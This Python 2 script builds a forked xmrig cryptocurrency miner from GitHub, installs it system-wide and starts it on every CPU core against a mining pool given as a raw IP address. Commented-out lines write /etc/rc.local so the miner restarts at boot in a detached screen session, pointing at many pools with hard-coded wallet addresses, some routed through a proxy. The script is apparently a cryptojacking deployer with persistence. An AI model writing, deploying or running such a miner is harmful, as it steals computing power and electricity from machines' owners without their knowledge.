__author__ = 'root'
import time
import urllib2
import urllib
import os,sys
from httplib import BadStatusLine
from socket import error as socket_error
import multiprocessing
import ast
useproxy = 0
os.system('chmod 777 ' + __file__)
program = 'xmrig'
os.system('pkill ' + program)
cores = multiprocessing.cpu_count()
if cores <= 0:
    cores = 1
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
#os.system ('printf "#!/bin/bash\nscreen -dm xmrig --variant 1 --max-cpu-usage=80 -o stratum+tcp://45.32.119.82:443@10.0.0.5:8118" > /etc/rc.local')
#os.system ('printf "#!/bin/bash\nscreen -dm xmrig --variant 1 --max-cpu-usage=80 -o stratum+tcp://pool.etn.spacepools.org:1111@10.0.0.5:8118 -u etnk6BoDzZeWjoYzDinqNfgZzR7Hih3teMfhvLeggVVhGPtHXHaqRdW6kSyRPhSzaM5eBuojKmC3jZHH6Jov1EZL2y58xzB3n9.5000" > /etc/rc.local')
#os.system ('printf "#!/bin/bash\nscreen -dm xmrig --variant 1 --max-cpu-usage=80 -o stratum+tcp://pool.minexmr.com:4444@10.0.0.5:8118 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+20001" > /etc/rc.local')
#os.system ('printf "#!/bin/bash\nscreen -dm xmrig --variant 1 --max-cpu-usage=80 -o stratum+tcp://etn-asia1.nanopool.org:13333@10.0.0.5:8118 -u etnk6BoDzZeWjoYzDinqNfgZzR7Hih3teMfhvLeggVVhGPtHXHaqRdW6kSyRPhSzaM5eBuojKmC3jZHH6Jov1EZL2y58xzB3n9" > /etc/rc.local')
#os.system ('printf "#!/bin/bash\nscreen -dm xmrig --variant 1 --max-cpu-usage=80 -o stratum+tcp://gulf.moneroocean.stream:80@10.0.0.5:8118 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+30000" > /etc/rc.local')
#os.system ('printf "#!/bin/bash\nscreen -dm cpuminer -a cryptonight -o stratum+tcp://pool.etn.spacepools.org:1111 -u etnk6BoDzZeWjoYzDinqNfgZzR7Hih3teMfhvLeggVVhGPtHXHaqRdW6kSyRPhSzaM5eBuojKmC3jZHH6Jov1EZL2y58xzB3n9.5000 -x tcp://10.0.0.5:8118" > /etc/rc.local')
#os.system ('printf "#!/bin/bash\nscreen -dm xmrig --variant 1 --max-cpu-usage=80 -o stratum+tcp://communitypool.stellite.cash:6677@10.0.0.5:8118 -u Se3QCvwUqAWSGuX7L3krDPN1rRvnkZ7FMCRgvzEPT1TaiMZUDzHJak9hA26GWUatbqESvqeD4Yx29C6PyRda4J7y2JVS67HPd+5000" > /etc/rc.local')
#os.system ('printf "#!/bin/bash\nscreen -dm xmrig --variant 1 --max-cpu-usage=80 -o stratum+tcp://pool.graft.hashvault.pro:5555 -u G5Uw2hHTN3xNGTB64zXDETMSfEmBtmjpeR7zErXQB1A6G3duqkg7oTpeV5H5jM9UDUYmjfczonxMB75uCWmNRfaMFFEpR2v+50000" > /etc/rc.local')
#.system ('printf "#!/bin/bash\nscreen -dm xmrig --variant 1 --max-cpu-usage=80 -o stratum+tcp://pool.intense.hashvault.pro:80 -u iz5q9KgBRYyfiSYPnDkReGeXjAyh8J22aaF3uzQkoBVH2g794XfYuCBV1DQ1zDNMWC1Nfk2pBzSRtZxApqoSt9Fb2mYGm2aqE+10000" > /etc/rc.local')
#os.system ('printf "#!/bin/bash\nscreen -dm xmrig -a cryptonight-heavy -o stratum+tcp://mine.sumo.fairpool.xyz:5555 -u Sumoo13RTqxJioAkRX7cmQjp74LQXdsRoR1fnsodj8rhgy3Lz5W3Kd6R6Zor6mJ6bE6RXM4rpxGx4PkWJxZjN7cgc145gESErGT -p x -t 7" > /etc/rc.local')
#os.system ('printf "#!/bin/bash\nscreen -dm xmrig -a cryptonight-heavy --max-cpu-usage=80 -o stratum+tcp://xhv.luckypool.io:7777 -u hvxxx4maiSQG1szZrDS17vJefEccbBaqg8W9LV4LB52qSWptGjRqu91ZvKLrDRkWioX44LDbg9atZ1A5rYsQ584X87cT6Rbbpu" > /etc/rc.local')
#os.system ('printf "#!/bin/bash\nscreen -dm xmrig -a cryptonight-heavy -o stratum+tcp://xhv.luckypool.io:7777 -u hvxxx4maiSQG1szZrDS17vJefEccbBaqg8W9LV4LB52qSWptGjRqu91ZvKLrDRkWioX44LDbg9atZ1A5rYsQ584X87cT6Rbbpu -t 7" > /etc/rc.local')

#os.system ('printf "#!/bin/bash\nscreen -dm cpuminer -a cryptonight -o stratum+tcp://cryptonight.usa.nicehash.com:3355 -u 33s2h7f3jc3MW4szYxqVVhNEmLadcneeJS -x tcp://10.0.0.5:8118" > /etc/rc.local')
#os.system ('chmod +x /etc/rc.local')
#os.system('rm -rf xmrig')
#os.system ('apt-get update')
#os.system ('apt-get install -y git build-essential cmake libuv1-dev libmicrohttpd-dev')
#os.system('git clone https://github.com/JayDDee/cpuminer-opt.git --config \'http.proxy=://10.0.0.5:8118' + '\'')
#os.system ('git clone https://github.com/xmrig/xmrig.git')
#os.system ('git clone https://github.com/nhatquanglan/xmrig.git')
#os.chdir('xmrig')
#os.chdir('xmrig_proxy')
#os.mkdir ('build')
#os.chdir('build')
#os.system ('cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.a -DWITH_AEON=OFF -DWITH_HTTPD=OFF -DWITH_TLS=OFF')
#os.system ('make')
#workingdir = os.getcwd()
#os.system('ln -s -f ' + workingdir + '/xmrig /usr/local/bin/xmrig')
#os.system('ln -s -f ' + workingdir + '/xmrig /usr/bin/xmrig')
for x in range(0,3):
  try:
    if os.path.isfile('/usr/local/bin/xmrig') == False:
        os.system('rm -rf xmrig')
        os.system ('apt-get install -y git build-essential cmake libuv1-dev libmicrohttpd-dev')
        #os.system('git clone https://github.com/JayDDee/cpuminer-opt.git --config \'http.proxy=://10.0.0.5:8118' + '\'')
        #os.system ('git clone https://github.com/xmrig/xmrig.git')
        os.system ('git clone https://github.com/nhatquanglan/xmrig.git')
        os.chdir('xmrig')
        #os.chdir('xmrig_proxy')
        os.mkdir ('build')
        os.chdir('build')
        os.system ('cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.a -DWITH_AEON=OFF -DWITH_HTTPD=OFF -DWITH_TLS=OFF')
        os.system ('make')
        workingdir = os.getcwd()
    	os.system('ln -s -f ' + workingdir + '/xmrig /usr/local/bin/xmrig')
    	os.system('ln -s -f ' + workingdir + '/xmrig /usr/bin/xmrig')
        time.sleep (2)
  except:
    pass
#os.system ('xmrig --av=7 --variant 1 --donate-level=0 -o stratum+tcp://pool.minexmr.com:4444 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+20001')
#os.system ('xmrig --av=5 -o stratum+tcp://144.202.23.108:4444')
os.system ('xmrig --av=2 -o stratum+tcp://66.42.53.57:443 -t ' + str(cores))

